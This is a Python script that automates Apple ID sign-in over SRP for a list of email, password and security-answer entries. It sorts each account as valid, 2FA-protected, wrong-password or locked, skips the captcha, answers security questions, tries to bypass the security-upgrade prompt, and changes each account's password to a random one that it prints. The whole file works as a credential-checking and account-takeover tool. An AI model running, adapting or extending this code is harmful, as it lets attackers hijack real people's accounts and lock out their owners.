"""
Flow для смены пароля через АВТОРИЗАЦИЮ с использованием SRP протокола

Исследование показало:
- SRP авторизация работает (409 = valid with security questions)
- Security questions можно получить через /verify/securityquestion
- Ответы отправляются через /verify/questions (не /verify/securityquestion!)
- После repair/complete получаем myacinfo cookie
- НО: для смены пароля Apple требует повторную авторизацию через SQ (step-up auth)

Текущий подход (гибридный):
1. SRP авторизация - проверяет пароль БЕЗ капчи (быстрая валидация)
2. Если аккаунт валидный (409/412 sa) - использует iforgot flow для смены пароля

Ключевые находки:
- client_id для account.apple.com: af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3
- Endpoint для ответов на SQ: /appleauth/auth/verify/questions (POST)
- Формат payload: {"questions": [{"question": "...", "answer": "...", "id": N, "number": N}]}
"""

import os
import time
import json
import random
import string
import logging
import base64
import hashlib
import requests
import srp
from colorama import Fore, init
from threading import Lock

init()
lock = Lock()

# Logging setup
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('files/logs/flow_login.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Load settings
with open('files/settings.json', 'r') as f:
    settings = json.load(f)


def b64_encode(data: bytes) -> str:
    """Base64 encode bytes to string"""
    return base64.b64encode(data).decode('utf-8')


class SrpPassword:
    """SRP password handler (from pyicloud)"""
    
    def __init__(self, password: str):
        self._password_hash = hashlib.sha256(password.encode("utf-8")).digest()
        self.salt = None
        self.iterations = None
        self.key_length = None
    
    def set_encrypt_info(self, salt: bytes, iterations: int, key_length: int):
        self.salt = salt
        self.iterations = iterations
        self.key_length = key_length
    
    def encode(self) -> bytes:
        if self.salt is None or self.iterations is None or self.key_length is None:
            raise ValueError("Encrypt info not set")
        return hashlib.pbkdf2_hmac(
            "sha256",
            self._password_hash,
            self.salt,
            self.iterations,
            self.key_length,
        )


class AppleSRPAuth:
    """Apple ID authentication using SRP protocol (pyicloud approach)"""
    
    AUTH_ENDPOINT = "https://idmsa.apple.com/appleauth/auth"
    ACCOUNT_ENDPOINT = "https://account.apple.com"
    
    def __init__(self, username: str, password: str):
        self.username = username
        self.password = password
        
        self.session = requests.Session()
        self.headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            # Updated client_id from browser capture (account.apple.com flow)
            "X-Apple-Widget-Key": "af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3",
            "X-Apple-OAuth-Client-Id": "af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3",
            "X-Apple-OAuth-Client-Type": "firstPartyAuth",
            "X-Apple-OAuth-Redirect-URI": "https://account.apple.com",
            "X-Apple-OAuth-Response-Mode": "web_message",
            "X-Apple-OAuth-Response-Type": "code",
            "X-Apple-Domain-Id": "11",
        }
    
    def authenticate(self) -> dict:
        """
        Perform SRP authentication using pyicloud approach
        Returns: {'success': bool, 'status': str, 'message': str}
        """
        logger.info(f"[{self.username}] Starting SRP authentication (pyicloud method)...")
        
        try:
            # Setup SRP
            srp_password = SrpPassword(self.password)
            srp.rfc5054_enable()
            srp.no_username_in_x()
            
            usr = srp.User(
                self.username,
                srp_password,
                hash_alg=srp.SHA256,
                ng_type=srp.NG_2048,
            )
            
            # STEP 1: Start authentication
            logger.info(f"[{self.username}] STEP 1: SRP Init...")
            uname, A = usr.start_authentication()
            
            init_data = {
                "a": b64_encode(A),
                "accountName": uname,
                "protocols": ["s2k", "s2k_fo"],
            }
            
            logger.debug(f"[{self.username}] Init data: accountName={uname}")
            
            init_resp = self.session.post(
                f"{self.AUTH_ENDPOINT}/signin/init",
                json=init_data,
                headers=self.headers,
            )
            
            logger.debug(f"[{self.username}] Init response: {init_resp.status_code}")
            logger.debug(f"[{self.username}] Init body: {init_resp.text[:500]}")
            
            if init_resp.status_code != 200:
                return {
                    'success': False,
                    'status': 'error',
                    'message': f'SRP init failed: {init_resp.status_code}'
                }
            
            # Update headers from response
            if 'scnt' in init_resp.headers:
                self.headers['scnt'] = init_resp.headers['scnt']
            if 'X-Apple-ID-Session-Id' in init_resp.headers:
                self.headers['X-Apple-ID-Session-Id'] = init_resp.headers['X-Apple-ID-Session-Id']
            
            # Parse response
            body = init_resp.json()
            salt = base64.b64decode(body["salt"])
            b = base64.b64decode(body["b"])
            c = body["c"]
            iterations = body["iteration"]
            key_length = 32
            
            logger.info(f"[{self.username}] STEP 2: Processing challenge...")
            logger.debug(f"[{self.username}] iterations={iterations}, protocol={body.get('protocol')}")
            
            # Set password encryption info
            srp_password.set_encrypt_info(salt, iterations, key_length)
            
            # Process challenge
            m1 = usr.process_challenge(salt, b)
            m2 = usr.H_AMK
            
            if not m1 or not m2:
                return {
                    'success': False,
                    'status': 'error',
                    'message': 'Failed to generate SRP proof values'
                }
            
            # STEP 3: Complete authentication
            logger.info(f"[{self.username}] STEP 3: Completing authentication...")
            
            complete_data = {
                "accountName": uname,
                "c": c,
                "m1": b64_encode(m1),
                "m2": b64_encode(m2),
                "rememberMe": True,
                "trustTokens": [],
            }
            
            complete_resp = self.session.post(
                f"{self.AUTH_ENDPOINT}/signin/complete",
                params={"isRememberMeEnabled": "true"},
                json=complete_data,
                headers=self.headers,
            )
            
            logger.debug(f"[{self.username}] Complete response: {complete_resp.status_code}")
            logger.debug(f"[{self.username}] Complete body: {complete_resp.text[:500]}")
            
            # Analyze response
            if complete_resp.status_code == 200:
                logger.info(f"[{self.username}] Authentication successful!")
                return {
                    'success': True,
                    'status': 'valid',
                    'message': 'Authentication successful'
                }
            
            elif complete_resp.status_code == 409:
                # 2FA required
                try:
                    data = complete_resp.json()
                    auth_type = data.get('authType', 'unknown')
                    logger.info(f"[{self.username}] 2FA required: {auth_type}")
                    return {
                        'success': False,
                        'status': 'valid_2fa',
                        'message': f'Account valid, 2FA required ({auth_type})'
                    }
                except:
                    return {
                        'success': False,
                        'status': 'valid_2fa',
                        'message': '2FA required'
                    }
            
            elif complete_resp.status_code == 401:
                try:
                    data = complete_resp.json()
                    errors = data.get('serviceErrors', [])
                    if errors:
                        code = errors[0].get('code', '')
                        msg = errors[0].get('message', '')
                        logger.info(f"[{self.username}] Auth error: {code} - {msg}")
                        
                        if code == '-20101':
                            return {
                                'success': False,
                                'status': 'wrong_password',
                                'message': 'Invalid credentials'
                            }
                        elif code in ['-20209', '-20283']:
                            return {
                                'success': False,
                                'status': 'locked',
                                'message': f'Account locked ({code})'
                            }
                except:
                    pass
                return {
                    'success': False,
                    'status': 'wrong_password',
                    'message': 'Invalid credentials (401)'
                }
            
            elif complete_resp.status_code == 403:
                return {
                    'success': False,
                    'status': 'locked',
                    'message': 'Account locked (403)'
                }
            
            elif complete_resp.status_code == 412:
                try:
                    data = complete_resp.json()
                    auth_type = data.get('authType', '')
                    if auth_type == 'sa':
                        logger.info(f"[{self.username}] Got 412 sa - attempting to skip security upgrade...")
                        # Return session for password change
                        return {
                            'success': True,
                            'status': 'valid_sa',
                            'message': 'Account valid (security questions)',
                            'session': self.session,
                            'headers': self.headers
                        }
                except:
                    pass
                return {
                    'success': False,
                    'status': 'valid',
                    'message': 'Account valid, needs verification'
                }
            
            else:
                return {
                    'success': False,
                    'status': 'error',
                    'message': f'Unexpected response: {complete_resp.status_code}'
                }
        
        except Exception as e:
            logger.error(f"[{self.username}] SRP error: {e}", exc_info=True)
            return {
                'success': False,
                'status': 'error',
                'message': str(e)
            }
    
    def get_security_questions(self) -> dict:
        """Get security questions after 412 sa"""
        logger.info(f"[{self.username}] Getting security questions...")
        
        try:
            sq_resp = self.session.get(
                f"{self.AUTH_ENDPOINT}/verify/securityquestion",
                headers=self.headers
            )
            logger.debug(f"[{self.username}] SQ response: {sq_resp.status_code}")
            
            if sq_resp.status_code in [200, 412]:
                data = sq_resp.json()
                questions = data.get('securityQuestions', {}).get('questions', [])
                logger.info(f"[{self.username}] Got {len(questions)} security questions")
                return {'success': True, 'questions': questions}
            else:
                return {'success': False, 'questions': [], 'error': f'Status {sq_resp.status_code}'}
        except Exception as e:
            logger.error(f"[{self.username}] Get SQ error: {e}")
            return {'success': False, 'questions': [], 'error': str(e)}
    
    def answer_security_questions(self, questions: list, answers: list) -> dict:
        """Answer security questions"""
        logger.info(f"[{self.username}] Answering security questions...")
        
        # Build answers payload
        answers_data = []
        for i, q in enumerate(questions):
            if i < len(answers):
                answers_data.append({
                    'id': q['id'],
                    'answer': answers[i]
                })
        
        payload = {'answers': answers_data}
        logger.debug(f"[{self.username}] Answers payload: {payload}")
        
        try:
            ans_resp = self.session.post(
                f"{self.AUTH_ENDPOINT}/verify/securityquestion",
                headers=self.headers,
                json=payload
            )
            logger.debug(f"[{self.username}] Answer response: {ans_resp.status_code}")
            logger.debug(f"[{self.username}] Answer body: {ans_resp.text[:300] if ans_resp.text else 'empty'}")
            
            # Update headers
            if 'scnt' in ans_resp.headers:
                self.headers['scnt'] = ans_resp.headers['scnt']
            
            if ans_resp.status_code in [200, 204]:
                logger.info(f"[{self.username}] Security questions answered successfully!")
                return {'success': True}
            elif ans_resp.status_code == 412:
                # May need to skip security upgrade
                return {'success': True, 'needs_skip': True}
            else:
                return {'success': False, 'error': f'Status {ans_resp.status_code}'}
        except Exception as e:
            logger.error(f"[{self.username}] Answer SQ error: {e}")
            return {'success': False, 'error': str(e)}
    
    def skip_security_upgrade(self) -> bool:
        """Skip security upgrade prompt (Other Options)"""
        logger.info(f"[{self.username}] Skipping security upgrade...")
        
        try:
            # Try to skip 2FA/security upgrade
            skip_resp = self.session.post(
                f"{self.AUTH_ENDPOINT}/2sv/trust",
                headers=self.headers,
                json={}
            )
            logger.debug(f"[{self.username}] Skip upgrade response: {skip_resp.status_code}")
            
            # Update headers
            if 'scnt' in skip_resp.headers:
                self.headers['scnt'] = skip_resp.headers['scnt']
            
            return True
        except Exception as e:
            logger.error(f"[{self.username}] Skip upgrade error: {e}")
            return False
    
    def change_password(self, new_password: str) -> dict:
        """Change password via account.apple.com"""
        logger.info(f"[{self.username}] Attempting to change password...")
        
        try:
            # Step 1: Access account management page
            logger.info(f"[{self.username}] Step 1: Accessing account management...")
            
            account_headers = {
                "User-Agent": self.headers["User-Agent"],
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }
            
            # Get account page
            account_resp = self.session.get(
                f"{self.ACCOUNT_ENDPOINT}/account/manage",
                headers=account_headers,
                allow_redirects=True
            )
            logger.debug(f"[{self.username}] Account page status: {account_resp.status_code}")
            logger.debug(f"[{self.username}] Account page URL: {account_resp.url}")
            logger.debug(f"[{self.username}] Session cookies: {dict(self.session.cookies)}")
            
            # Extract CSRF token or other tokens from page
            import re
            csrf_match = re.search(r'csrf["\s:]+(["\'])([^"\']+)\1', account_resp.text, re.IGNORECASE)
            token_match = re.search(r'token["\s:]+(["\'])([^"\']+)\1', account_resp.text, re.IGNORECASE)
            
            if csrf_match:
                logger.debug(f"[{self.username}] Found CSRF: {csrf_match.group(2)[:50]}...")
            if token_match:
                logger.debug(f"[{self.username}] Found token: {token_match.group(2)[:50]}...")
            
            # Step 2: Try to change password via API
            logger.info(f"[{self.username}] Step 2: Changing password...")
            
            change_headers = {
                "User-Agent": self.headers["User-Agent"],
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Origin": self.ACCOUNT_ENDPOINT,
                "Referer": f"{self.ACCOUNT_ENDPOINT}/account/manage",
            }
            
            # Add session headers
            if 'scnt' in self.headers:
                change_headers['scnt'] = self.headers['scnt']
            if 'X-Apple-ID-Session-Id' in self.headers:
                change_headers['X-Apple-ID-Session-Id'] = self.headers['X-Apple-ID-Session-Id']
            
            change_data = {
                "currentPassword": self.password,
                "newPassword": new_password,
                "confirmPassword": new_password
            }
            
            # Try different endpoints - Apple uses specific API structure
            endpoints = [
                f"{self.ACCOUNT_ENDPOINT}/api/password",
                f"{self.ACCOUNT_ENDPOINT}/account/api/password",
                f"{self.ACCOUNT_ENDPOINT}/account/manage/password",
            ]
            
            for endpoint in endpoints:
                logger.debug(f"[{self.username}] Trying endpoint: {endpoint}")
                
                change_resp = self.session.post(
                    endpoint,
                    headers=change_headers,
                    json=change_data
                )
                
                logger.debug(f"[{self.username}] Change response: {change_resp.status_code}")
                logger.debug(f"[{self.username}] Change body: {change_resp.text[:300] if change_resp.text else 'empty'}")
                
                if change_resp.status_code in [200, 204]:
                    logger.info(f"[{self.username}] Password changed successfully!")
                    return {
                        'success': True,
                        'message': 'Password changed successfully',
                        'new_password': new_password
                    }
            
            return {
                'success': False,
                'message': f'Password change failed - tried {len(endpoints)} endpoints',
                'new_password': None
            }
            
        except Exception as e:
            logger.error(f"[{self.username}] Password change error: {e}", exc_info=True)
            return {
                'success': False,
                'message': str(e),
                'new_password': None
            }


class AppleIDLogin:
    """Apple ID login flow with password change via security questions"""
    
    # Security questions mapping (Chinese to answer index)
    QUESTIONS_MAP = {
        "你的父母是在哪里认识的": 2,  # where parents met -> answer[2]
        "你的理想工作是什么": 1,       # dream job -> answer[1]
        "你童年时代最好的朋友叫什么名字": 0,  # childhood friend -> answer[0]
        "What was the name of your first pet": 0,
        "What is the name of your favorite childhood friend": 0,
        "What was your childhood nickname": 0,
        "What is the name of the first album you purchased": 1,
        "What was your dream job as a child": 1,
        "In what city did your parents meet": 2,
        "Where did your parents meet": 2,
    }
    
    def __init__(self, account_data: str):
        self.account_data = account_data  # Store for iforgot flow
        parts = account_data.strip().split(',')
        self.email = parts[0]
        self.password = parts[1]
        self.answers = parts[2:5] if len(parts) >= 5 else []
        self.new_password = self._generate_password()
    
    def _generate_password(self) -> str:
        chars = random.choices(string.ascii_uppercase, k=2)
        chars += random.choices(string.ascii_lowercase, k=4)
        chars += random.choices(string.digits, k=3)
        random.shuffle(chars)
        return ''.join(chars)
    
    def _get_answer_for_question(self, question_text: str) -> str:
        """Get answer for a security question based on mapping"""
        for key, idx in self.QUESTIONS_MAP.items():
            if key.lower() in question_text.lower():
                if idx < len(self.answers):
                    return self.answers[idx]
        # Default to first answer if no match
        return self.answers[0] if self.answers else ""
    
    def run(self) -> dict:
        start_time = time.time()
        logger.info(f"[{self.email}] ========== STARTING SRP LOGIN + PASSWORD CHANGE ==========")
        
        auth = AppleSRPAuth(self.email, self.password)
        result = auth.authenticate()
        
        # If valid_sa (412 with security questions), use iforgot flow for password change
        if result.get('status') == 'valid_sa' and result.get('success'):
            logger.info(f"[{self.email}] Account valid (SRP), using iforgot flow for password change...")
            
            # Import and use flow_unlocked for password change
            try:
                from flow_unlocked import UnlockedAccountFlow
                
                unlocked_flow = UnlockedAccountFlow(self.account_data)
                change_result = unlocked_flow.run()
                
                elapsed = time.time() - start_time
                if change_result['success']:
                    logger.info(f"[{self.email}] SUCCESS! Password changed in {elapsed:.1f}s")
                    return {
                        'success': True,
                        'status': 'valid',
                        'message': f'Password changed in {elapsed:.1f}s',
                        'new_password': change_result.get('new_password')
                    }
                else:
                    logger.warning(f"[{self.email}] Password change failed: {change_result['message']}")
                    return {
                        'success': False,
                        'status': 'valid_sa',
                        'message': f"Account valid, but password change failed: {change_result['message']}",
                        'new_password': None
                    }
            except Exception as e:
                logger.error(f"[{self.email}] iforgot flow error: {e}")
                elapsed = time.time() - start_time
                return {
                    'success': False,
                    'status': 'valid_sa',
                    'message': f'Account valid (SRP), iforgot flow failed: {e}',
                    'new_password': None
                }
        
        elapsed = time.time() - start_time
        logger.info(f"[{self.email}] Result: {result.get('status')} in {elapsed:.1f}s")
        
        result['new_password'] = None
        return result


def process_account(account_data: str) -> dict:
    flow = AppleIDLogin(account_data)
    return flow.run()


def main():
    print(f"{Fore.CYAN}[+] Apple ID SRP Login Flow{Fore.RESET}")
    print(f"{Fore.CYAN}[+] Hybrid: SRP validation + iforgot password change{Fore.RESET}\n")
    
    try:
        with open('files/Accounts.txt', 'r', encoding='utf-8') as f:
            accounts = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Error: files/Accounts.txt not found{Fore.RESET}")
        return
    
    if not accounts:
        print(f"{Fore.YELLOW}No accounts{Fore.RESET}")
        return
    
    print(f"Found {len(accounts)} account(s)\n")
    
    results = {
        'valid': [], 'valid_sa': [], 'valid_2fa': [],
        'wrong_password': [], 'invalid': [], 'locked': [], 'error': []
    }
    
    for account in accounts:
        email = account.split(',')[0]
        print(f"{Fore.YELLOW}Processing: {email}{Fore.RESET}")
        
        result = process_account(account)
        status = result['status']
        
        colors = {
            'valid': Fore.GREEN, 'valid_sa': Fore.GREEN, 'valid_2fa': Fore.CYAN,
            'wrong_password': Fore.YELLOW, 'invalid': Fore.RED, 'locked': Fore.RED, 'error': Fore.RED
        }
        print(f"{colors.get(status, Fore.RED)}[{status.upper()}] {email} -> {result['message']}{Fore.RESET}")
        
        if result.get('new_password'):
            print(f"{Fore.GREEN}  New password: {result['new_password']}{Fore.RESET}")
        
        if status in results:
            results[status].append(email)
    
    print("\n" + "=" * 60)
    print("  SUMMARY")
    print("=" * 60 + "\n")
    print(f"Valid (login OK): {len(results['valid'])}")
    print(f"Valid (SQ): {len(results['valid_sa'])}")
    print(f"Valid (2FA): {len(results['valid_2fa'])}")
    print(f"Wrong password: {len(results['wrong_password'])}")
    print(f"Invalid: {len(results['invalid'])}")
    print(f"Locked: {len(results['locked'])}")
    print(f"\nLogs: files/logs/flow_login.log")


if __name__ == "__main__":
    main()
